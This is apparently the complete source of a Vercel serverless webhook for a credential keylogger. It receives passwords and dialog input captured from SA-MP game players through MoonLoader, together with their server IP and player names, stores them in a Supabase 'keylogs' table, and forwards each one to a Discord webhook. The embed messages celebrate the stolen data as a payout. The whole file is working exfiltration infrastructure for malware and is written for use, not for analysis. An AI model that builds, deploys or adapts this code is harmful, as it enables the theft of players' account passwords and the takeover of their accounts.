// ==========================================
// KEYLOG WEBHOOK - VERCEL + SUPABASE
// ==========================================
// - Terima data dari MoonLoader
// - Simpan ke Supabase
// - Forward ke Discord
// - Hapus dari Supabase setelah berhasil
// ==========================================

import { createClient } from '@supabase/supabase-js';

// ==========================================
// KONFIGURASI (dari Environment Variables)
// ==========================================
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
const API_KEY = process.env.API_KEY || 'runzyt2026rowr';

// Inisialisasi Supabase
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

// ==========================================
// MAIN HANDLER (Vercel Serverless Function)
// ==========================================
export default async function handler(req, res) {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-API-Key');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // AUTH
    const providedKey = req.headers['x-api-key'];
    if (providedKey !== API_KEY) {
        return res.status(401).json({
            success: false,
            error: 'Unauthorized'
        });
    }

    // Hanya POST
    if (req.method !== 'POST') {
        return res.status(405).json({
            success: false,
            error: 'Method not allowed'
        });
    }

    try {
        const data = req.body;

        // Validasi
        if (!data.inputtext && !data.password) {
            return res.status(400).json({
                success: false,
                error: 'Missing inputtext or password'
            });
        }

        // ==========================================
        // 1. SIMPAN KE SUPABASE
        // ==========================================
        const logEntry = {
    id: Date.now().toString(36) + Math.random().toString(36).substr(2, 6),
    timestamp: data.timestamp || new Date().toISOString(),
    servername: data.servername || 'Unknown',
    ip: data.ip || '0.0.0.0',
    port: data.port || 0,
    player_name: data.playerName || 'Unknown',
    player_id: data.playerId || null,        // BARU
    dialog_id: data.dialogId || null,        // BARU
    password: data.password || data.inputtext,
    inputtext: data.inputtext,
    platform: data.platform || 'MoonLoader',
    status: 'pending',
    created_at: new Date().toISOString()
    };

        // Insert ke Supabase
        const { error: insertError } = await supabase
            .from('keylogs')
            .insert(logEntry);

        if (insertError) {
            console.error('[Supabase] Insert error:', insertError);
            return res.status(500).json({
                success: false,
                error: insertError.message
            });
        }

        console.log(`[Supabase] Saved log: ${logEntry.id}`);

        // ==========================================
        // 2. FORWARD KE DISCORD
        // ==========================================
        const discordSuccess = await sendToDiscord(logEntry);

        // ==========================================
        // 3. UPDATE STATUS DI SUPABASE
        // ==========================================
        if (discordSuccess) {
            await supabase
                .from('keylogs')
                .update({ status: 'sent' })
                .eq('id', logEntry.id);
            console.log(`[Supabase] Updated status to 'sent': ${logEntry.id}`);
        } else {
            await supabase
                .from('keylogs')
                .update({ status: 'failed' })
                .eq('id', logEntry.id);
            console.log(`[Supabase] Updated status to 'failed': ${logEntry.id}`);
        }

        // ==========================================
        // 4. KIRIM RESPONSE KE CLIENT
        // ==========================================
        return res.status(200).json({
            success: true,
            id: logEntry.id,
            sentToDiscord: discordSuccess,
            status: discordSuccess ? 'sent' : 'failed'
        });

    } catch (error) {
        console.error('[ERROR]', error);
        return res.status(500).json({
            success: false,
            error: error.message
        });
    }
}

// ==========================================
// FUNGSI KIRIM KE DISCORD
// ==========================================
async function sendToDiscord(log) {
    if (!DISCORD_WEBHOOK_URL) {
        console.warn('[WARN] DISCORD_WEBHOOK_URL not set');
        return false;
    }

    const embedData = {
    embeds: [{
        title: 'PAKET WOII!!',
        description: '**CAIRR💸 njir',
        color: 16776960,
        footer: {
            text: `ID: ${log.id} | Supabase + Vercel`
        },
        timestamp: log.timestamp,
        fields: [
            { name: '📡 Server', value: log.servername, inline: false },
            { name: '🌐 IP Address', value: `${log.ip}:${log.port}`, inline: false },
            { name: '👤 Player Name', value: log.player_name, inline: false },
            { 
                name: '🆔 Player ID', 
                value: log.player_id || 'N/A', 
                inline: true 
            },
            { 
                name: '💬 Dialog ID', 
                value: log.dialog_id || 'N/A', 
                inline: true 
            },
            { name: '⌨️ Input / Password', value: `\`\`\`\n${log.password}\n\`\`\``, inline: false }
        ]
    }]
};

    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(embedData)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error('[DISCORD] Error:', errorText);
            return false;
        }

        console.log('[DISCORD] Sent successfully');
        return true;

    } catch (error) {
        console.error('[DISCORD] Exception:', error);
        return false;
    }
}
